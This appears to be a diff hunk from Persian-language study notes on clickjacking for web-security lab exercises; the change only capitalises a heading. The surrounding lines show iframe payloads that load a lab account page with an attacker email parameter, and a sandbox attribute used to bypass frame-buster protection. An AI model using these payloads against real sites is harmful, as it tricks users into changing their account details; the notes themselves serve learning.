@@ -27,7 +27,7 @@
 ```HTML
 <iframe src="https://ac721fc61e66ddc6c0325ed500ca00d4.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
 ```
-- **بای پاس کردن frame buster**
+- **بای پاس کردن Frame Buster**
   - در اینحالت اجازه iframe کردن سایت قربانی را نخواهیم داشت، برای دور زدن این محافظت attribute زیر را به تگ iframe اضافه می کنیم:
 ```HTML
 <iframe sandbox="allow-forms" src="https://ac1f1fd41fe93c54c00a5216000e009e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
